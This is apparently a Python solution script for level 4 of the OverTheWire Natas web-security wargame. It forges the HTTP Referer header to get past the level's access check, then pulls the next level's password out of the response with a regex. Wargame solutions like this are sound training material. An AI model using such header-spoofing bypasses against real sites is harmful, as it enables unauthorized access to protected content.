import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def get_pass():
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '4'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas4', passw.strip())
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    #This level wants the referrer proprety of the html request to be from natas5, so change that by hand
    header = {'Referer':'http://natas5.natas.labs.overthewire.org/'}
    r = requests.get('http://natas4.natas.labs.overthewire.org/', auth=auth, headers=header)
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[1])

if __name__ == "__main__":
    get_pass()
